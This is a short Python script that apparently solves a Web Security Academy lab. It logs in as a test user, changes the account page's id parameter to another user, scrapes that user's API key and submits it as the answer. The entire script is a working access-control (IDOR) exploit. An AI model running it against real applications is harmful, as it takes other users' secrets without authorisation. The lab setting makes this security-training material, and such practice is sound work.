import requests
from bs4 import BeautifulSoup
import re


s = requests.Session()
site = 'ac981f7b1efd76d38070105000c8005e.web-security-academy.net'
login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

logindata = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter'
}
resp = s.post(login_url, data=logindata)
print(resp.status_code)

# Now to get the API Key:

resp = s.get(url='https://ac981f7b1efd76d38070105000c8005e.web-security-academy.net/my-account?id=carlos', data=logindata)
print(resp)
soup = BeautifulSoup(resp.text, 'html.parser')
div_text = soup.find('div', text=re.compile('API')).text
api_key = div_text.split(' ')[4]
print(api_key)

url = f'https://{site}/submitSolution'
resp = s.post(url, data={'answer': api_key})